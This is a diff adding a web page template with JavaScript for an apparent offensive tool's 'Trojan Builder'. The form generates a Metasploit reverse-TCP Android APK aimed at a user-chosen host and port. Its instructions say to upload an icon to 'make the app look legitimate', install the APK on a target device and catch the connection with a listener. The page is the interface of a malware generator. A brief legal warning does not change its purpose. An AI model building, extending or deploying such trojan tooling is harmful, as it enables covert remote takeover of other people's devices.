@@ -1,0 +1,227 @@
+{% extends "base.html" %}
+
+{% block title %}SARA - Trojan Builder{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-lg-8 mx-auto">
+        <div class="card bg-secondary">
+            <div class="card-header">
+                <h4 class="card-title mb-0">
+                    <i class="bi bi-bug text-danger"></i> Trojan Builder
+                </h4>
+            </div>
+            <div class="card-body">
+                <p class="text-muted mb-4">
+                    Create a custom trojan APK using Metasploit payload. 
+                    The generated APK will establish a reverse TCP connection to your specified host and port.
+                </p>
+
+                <form id="trojanForm">
+                    <div class="row g-3">
+                        <div class="col-md-6">
+                            <label for="appName" class="form-label">App Name</label>
+                            <input type="text" class="form-control" id="appName" name="name" 
+                                   placeholder="trojan" value="trojan">
+                            <div class="form-text">Name of the APK application</div>
+                        </div>
+
+                        <div class="col-md-6">
+                            <label for="appIcon" class="form-label">App Icon</label>
+                            <input type="file" class="form-control" id="appIcon" name="icon" 
+                                   accept=".png,.jpg,.jpeg,.gif">
+                            <div class="form-text">Custom icon for the app (optional)</div>
+                        </div>
+
+                        <div class="col-md-6">
+                            <label for="hostAddress" class="form-label">Host Address</label>
+                            <input type="text" class="form-control" id="hostAddress" name="host" 
+                                   placeholder="127.0.0.1" value="127.0.0.1" required>
+                            <div class="form-text">IP address where the trojan will connect</div>
+                        </div>
+
+                        <div class="col-md-6">
+                            <label for="hostPort" class="form-label">Port</label>
+                            <input type="number" class="form-control" id="hostPort" name="port" 
+                                   placeholder="4444" value="4444" min="1" max="65535" required>
+                            <div class="form-text">Port number for the connection</div>
+                        </div>
+
+                        <div class="col-12">
+                            <div class="alert alert-info">
+                                <i class="bi bi-info-circle"></i>
+                                <strong>Note:</strong> Make sure to start a listener on the specified host and port 
+                                before deploying the trojan. You can use the 
+                                <a href="{{ url_for('listener') }}" class="alert-link">Listener</a> page for this.
+                            </div>
+                        </div>
+
+                        <div class="col-12">
+                            <button type="submit" class="btn btn-danger" id="buildBtn">
+                                <i class="bi bi-bug"></i> Build Trojan APK
+                            </button>
+                            <a href="{{ url_for('index') }}" class="btn btn-secondary ms-2">
+                                <i class="bi bi-arrow-left"></i> Back to Home
+                            </a>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- Progress Section -->
+                <div id="progressSection" class="mt-4" style="display: none;">
+                    <div class="card bg-dark">
+                        <div class="card-body">
+                            <h6 class="card-title">
+                                <i class="bi bi-gear-fill"></i> Building APK...
+                            </h6>
+                            <div class="progress mb-3">
+                                <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated bg-danger" 
+                                     role="progressbar" style="width: 0%"></div>
+                            </div>
+                            <p id="progressText" class="mb-0 text-muted">Initializing...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Result Section -->
+                <div id="resultSection" class="mt-4" style="display: none;">
+                    <div id="resultCard" class="card">
+                        <div class="card-body">
+                            <h6 class="card-title">
+                                <i class="bi bi-check-circle text-success"></i> Build Complete
+                            </h6>
+                            <p id="resultText" class="mb-3"></p>
+                            <div id="downloadSection" style="display: none;">
+                                <a id="downloadLink" href="#" class="btn btn-success">
+                                    <i class="bi bi-download"></i> Download APK
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Information Panel -->
+<div class="row mt-4">
+    <div class="col-lg-8 mx-auto">
+        <div class="card bg-dark border-info">
+            <div class="card-header border-info">
+                <h6 class="card-title mb-0">
+                    <i class="bi bi-lightbulb"></i> How it Works
+                </h6>
+            </div>
+            <div class="card-body">
+                <ol>
+                    <li>Enter the target host IP address and port number</li>
+                    <li>Optionally upload a custom icon to make the app look legitimate</li>
+                    <li>Click "Build Trojan APK" to generate the malicious application</li>
+                    <li>Start a listener on your specified host and port</li>
+                    <li>Install the generated APK on the target Android device</li>
+                    <li>The trojan will connect back to your listener when executed</li>
+                </ol>
+                <div class="alert alert-warning mt-3">
+                    <i class="bi bi-exclamation-triangle"></i>
+                    <strong>Legal Warning:</strong> Only use this on devices you own or have explicit permission to test. 
+                    Unauthorized access to computer systems is illegal.
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_scripts %}
+<script>
+document.getElementById('trojanForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const buildBtn = document.getElementById('buildBtn');
+    const progressSection = document.getElementById('progressSection');
+    const resultSection = document.getElementById('resultSection');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+    
+    // Disable form and show progress
+    buildBtn.disabled = true;
+    buildBtn.innerHTML = '<i class="bi bi-gear-fill"></i> Building...';
+    progressSection.style.display = 'block';
+    resultSection.style.display = 'none';
+    
+    try {
+        // Handle file upload if present
+        let iconPath = 'data/tmp/icon.png';
+        const iconFile = document.getElementById('appIcon').files[0];
+        
+        if (iconFile) {
+            progressText.textContent = 'Uploading icon...';
+            progressBar.style.width = '20%';
+            
+            const formData = new FormData();
+            formData.append('icon', iconFile);
+            
+            const uploadResponse = await fetch('/upload_icon', {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (uploadResponse.ok) {
+                const uploadResult = await uploadResponse.json();
+                iconPath = uploadResult.path;
+            }
+        }
+        
+        // Build trojan
+        progressText.textContent = 'Building trojan APK...';
+        progressBar.style.width = '50%';
+        
+        const formData = {
+            name: document.getElementById('appName').value || 'trojan',
+            host: document.getElementById('hostAddress').value,
+            port: document.getElementById('hostPort').value,
+            icon: iconPath
+        };
+        
+        const response = await fetch('/build_trojan', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData)
+        });
+        
+        const result = await response.json();
+        
+        if (response.ok) {
+            progressBar.style.width = '100%';
+            progressText.textContent = 'Build complete!';
+            
+            // Show result
+            resultSection.style.display = 'block';
+            document.getElementById('resultCard').className = 'card bg-success';
+            document.getElementById('resultText').textContent = result.message;
+            
+            if (result.filename) {
+                document.getElementById('downloadSection').style.display = 'block';
+                document.getElementById('downloadLink').href = `/download/${result.filename}`;
+            }
+        } else {
+            throw new Error(result.error || 'Build failed');
+        }
+        
+    } catch (error) {
+        // Show error
+        resultSection.style.display = 'block';
+        document.getElementById('resultCard').className = 'card bg-danger';
+        document.getElementById('resultText').textContent = `Error: ${error.message}`;
+        document.getElementById('downloadSection').style.display = 'none';
+    } finally {
+        // Re-enable form
+        buildBtn.disabled = false;
+        buildBtn.innerHTML = '<i class="bi bi-bug"></i> Build Trojan APK';
+    }
+});
+</script>
+{% endblock %}
